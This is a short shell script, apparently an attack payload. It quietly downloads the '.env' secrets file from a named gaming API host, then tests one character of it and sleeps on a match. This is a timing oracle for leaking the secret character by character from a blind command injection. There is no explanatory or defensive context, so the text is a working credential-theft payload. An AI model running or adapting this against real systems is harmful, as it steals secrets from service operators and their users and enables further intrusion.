#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +5 /wa|head -c1)" < 'g' ]&&sleep 25
sleep 12
